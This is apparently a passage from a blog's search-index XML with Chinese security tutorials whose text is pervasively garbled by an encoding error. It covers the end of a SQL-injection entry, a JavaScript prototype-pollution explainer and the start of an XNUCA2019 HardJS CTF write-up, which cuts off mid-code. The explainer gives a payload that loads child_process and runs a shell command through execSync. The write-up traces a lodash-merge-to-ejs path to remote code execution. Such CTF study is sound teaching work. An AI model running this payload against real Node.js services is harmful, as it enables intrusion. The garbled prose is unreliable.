<p>ä¸å»¶æ—¶ï¼Œè¯´æ˜æ•°æ®åº“ä¸­æ— adddxxxå¼€å¤´çš„åˆ—åã€‚ç„¶åé€šè¿‡å¾ªç¯éå†æ‰€æœ‰å­—ç¬¦ï¼Œè·å–åˆ°æ•°æ®åº“ä¸­æ‰€æœ‰åˆ—åï¼ŒåŒæ ·çš„æ–¹æ³•å¯ä»¥è·å–è¡¨å</p>
<p>å…¶ä»–ä»¥æ­¤ç±»æ¨</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸå‹é“¾æ±¡æŸ“</title>
    <url>/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>éœ€è¦ä¸€å®šçš„jsåŸºç¡€</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownZHNuSfXCDk4OEab.jpg"></p>
<span id="more"></span>

<h1 id="prototypeå’Œ-proto"><a href="#prototypeå’Œ-proto" class="headerlink" title="prototypeå’Œ__proto__"></a><code>prototype</code>å’Œ<code>__proto__</code></h1><p>åˆç§°<code>åŸå‹é“¾æ±¡æŸ“</code>ã€‚</p>
<p>åœ¨JSè¯­è¨€ä¸­ï¼Œå‡½æ•°å³å¯¹è±¡ï¼Œå¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥<code>å®šä¹‰</code> æ„é€ å‡½æ•°çš„æ–¹å¼æ¥å®šä¹‰</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>


<p><strong>å³æ˜¯å‡½æ•°æ—¢å¯ä»¥ä½œä¸ºå¯¹è±¡å»è§£é‡Šåˆå¯ä»¥ä½œä¸ºå‡½æ•°å»è§£é‡Š</strong></p>
<p>ä¸ºäº†ç®€åŒ–ç¼–å†™JavaScriptä»£ç ï¼ŒECMAScript 6åå¢åŠ äº†<code>class</code>è¯­æ³•ï¼Œä½†<code>class</code>å…¶å®åªæ˜¯ä¸€ä¸ªå¯»æ‰¾åˆ°å…·ä½“æ–¹æ³•æˆ–è€…å±æ€§çš„æœºåˆ¶ã€‚</p>
<p>ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§<code>this.bar</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œ<code>this.show = function...</code>å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸ª<code>show</code>æ–¹æ³•å®é™…ä¸Šæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸­ã€‚</p>
<p>å¦‚æœå¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡<code>show</code>æ–¹æ³•ï¼Œè¿™æ—¶å€™å°±åˆ™éœ€è¦ä½¿ç”¨åŸå‹ï¼ˆprototypeï¼‰äº†ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>æ‰€ä»¥å¯ä»¥è®¤ä¸ºåŸå‹<code>prototype</code>æ˜¯ç±»<code>Foo</code>çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨<code>Foo</code>ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„<code>foo</code>å¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰<code>foo.show()</code>æ–¹æ³•ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Foo.prototype</code>æ¥è®¿é—®<code>Foo</code>ç±»çš„åŸå‹ï¼Œä½†<code>Foo</code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥<code>__proto__</code>ç™»åœºäº†ã€‚</p>
<p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡<code>foo.__proto__</code>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<p><code>foo.``**proto**`` == Foo.prototype</code></p>
<p><img src="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png"></p>
<p>æ‰€ä»¥ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p>
<ol>
<li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li>
<li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li>
</ol>
<h1 id="JavaScriptåŸå‹é“¾ç»§æ‰¿"><a href="#JavaScriptåŸå‹é“¾ç»§æ‰¿" class="headerlink" title="JavaScriptåŸå‹é“¾ç»§æ‰¿"></a>JavaScriptåŸå‹é“¾ç»§æ‰¿</h1><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>


<p>Sonç±»ç»§æ‰¿äº†Fatherç±»çš„<code>last_name</code>å±æ€§ï¼Œæœ€åè¾“å‡ºçš„æ˜¯<code>Name: Melania Trump</code>ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨<code>son.last_name</code>çš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<ol>
<li>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name</li>
<li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾last_name</li>
<li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾last_name</li>
<li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li>
</ol>
<p><img src="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png"></p>
<p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œ<code>prototypeç»§æ‰¿é“¾</code>ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œå¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p>
<ol>
<li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li>
<li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li>
<li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li>
</ol>
<h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><p>å‰é¢è¯´åˆ°ï¼Œ<code>foo.__proto__</code>æŒ‡å‘çš„æ˜¯<code>Foo</code>ç±»çš„<code>prototype</code>ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¿®æ”¹äº†<code>foo.__proto__</code>ä¸­çš„å€¼ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¿®æ”¹Fooç±»å‘¢ï¼Ÿ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar æ­¤æ—¶ä¸º1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>


<p>æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ª<strong>ç©º</strong>å¯¹è±¡<code>&#123;&#125;</code>ï¼Œä½†<code>zoo.bar</code>çš„ç»“æœå±…ç„¶æ˜¯2ï¼š</p>
<p><img src="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png"></p>
<p>åŸå› ä¹Ÿæ˜¾è€Œæ˜“è§ï¼šå› ä¸ºå‰é¢ä¿®æ”¹äº†fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚</p>
<p>åæ¥ï¼Œæˆ‘ä»¬åˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡<code>let zoo = &#123;&#125;</code>ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚</p>
<p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p>
<p>jsä¸­æœ‰ä¸ªjson.praseçš„æ–¹æ³•,jsonè§£æçš„æ—¶å€™,ä¼šæŠŠ<code>__proto__</code>å˜æˆä¸€ä¸ªé”®åï¼Œå¯ä»¥ç†è§£ä¸ºå’ŒaåŒçº§,è€Œä¸æ˜¯ä¸€ä¸ªåŸå‹çš„å±æ€§äº†ï¼Œå˜æˆä¸€ä¸ªæ™®é€šçš„å±æ€§ã€‚</p>
<p><img src="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png"></p>
<p>å¸¸è§„Payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">e =&gt; &#123; <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> &#123;&#125;) &#123; <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[a]; &#125; <span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;uname -a&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–è§†å…·ä½“æƒ…å†µæ”¹å˜ã€‚</p>
<p>ä¸€èˆ¬ä¸¤ä¸ªå‡½æ•°<code>(mergeï¼Œå’Œclone)</code>å¯ä»¥å½¢æˆæ”»å‡»ç¯å¢ƒ</p>
<p><code>[a.name](http://a.name)`` = a[&#39;name&#39;]</code></p>
<h1 id="XNUCA2019Qualifier-HardJS"><a href="#XNUCA2019Qualifier-HardJS" class="headerlink" title="[XNUCA2019Qualifier]HardJS"></a>[XNUCA2019Qualifier]HardJS</h1><p>è¿™é¢˜æ˜¯å¯ä»¥ä¸‹è½½æºç çš„ã€‚</p>
<p>æŸ¥çœ‹ejsçš„æºç ï¼Œçœ‹åˆ°ä¸‹é¢ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>server.js</code>ä¸­æ˜¯æœåŠ¡å™¨çš„ä¸»è¦é€»è¾‘ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä½¿ç”¨äº†<code>ejs</code>ä½œä¸ºæ¸²æŸ“å¼•æ“ï¼Œå¹¶ä½¿ç”¨äº†ä¸­é—´ä»¶<code>body-parser</code>ï¼Œé€šè¿‡è¿™ä¸€è¡Œä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extend</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>


<p>è¯´æ˜æœåŠ¡å™¨ä¼šæ¥æ”¶POSTä¼ è¿‡æ¥çš„jsonæ•°æ®ï¼Œè€Œä¸”æˆ‘ä¹ŸçŸ¥é“è¿™é“é¢˜ç›®çš„è€ƒå¯Ÿç‚¹å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ï¼ˆå› ä¸ºå°±æ˜¯å¥”ç€æŒæ¡è¿™ä¸ªçŸ¥è¯†ç‚¹æ¥åˆ·é¢˜çš„ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£ä¼ å…¥å‚æ•°åˆ°æœåŠ¡ç«¯äº†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span> ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(doms);</span><br><span class="line">            res.<span class="title function_">json</span>(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.<span class="property">length</span> ; i++)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">        res.<span class="title function_">json</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>åˆ†æä»¥ä¸Šä»£ç çŸ¥é“ï¼Œå½“<code>datalist</code>çš„é•¿åº¦å¤§äº5æ—¶ï¼Œä¼šæ‰§è¡Œè¿™ä¸€æ¡è¯­å¥ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>


<p>ç„¶åé—®é¢˜å°±å˜æˆäº†æ€ä¹ˆè®©<code>datalist</code> çš„é•¿åº¦å¤§äº5ï¼Œé€šè¿‡<code>server.js</code>å®šä¹‰çš„<code>/add</code>æ¥å£</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">type</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">content</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span>;</span><br><span class="line"></span><br><span class="line">        newContent[req.<span class="property">body</span>.<span class="property">type</span>] = [ req.<span class="property">body</span>.<span class="property">content</span> ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬åªéœ€è¦æ„é€ typeå’Œcontentä¸¤ä¸ªé”®å€¼ï¼Œå°†<code>Content-Type</code>è®¾ç½®ä¸º<code>application/json</code>ï¼Œç„¶åpostè®¿é—®è¯¥æ¥å£5æ¬¡ä»¥ä¸Šä¾¿å¯ä»¥</p>
<p>æ±¡æŸ“ç‚¹æ‰¾åˆ°äº†ï¼Œæ¥ä¸‹æ¥æ˜¯å¦‚ä½•åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ¥è·å–Flagï¼Œè¿™é“é¢˜ç›®æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<h2 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h2><h3 id="åˆ©ç”¨ejsè¿›è¡Œrce"><a href="#åˆ©ç”¨ejsè¿›è¡Œrce" class="headerlink" title="åˆ©ç”¨ejsè¿›è¡Œrce"></a>åˆ©ç”¨ejsè¿›è¡Œrce</h3><p>å› ä¸º<code>server.js</code>è°ƒç”¨äº†ejsä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œç»è¿‡è°ƒè¯•è·Ÿè¿›ï¼Œå¯ä»¥åœ¨<code>ejs.js</code>ä¸­å‘ç°å¦‚ä¸‹ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">...</span><br><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span 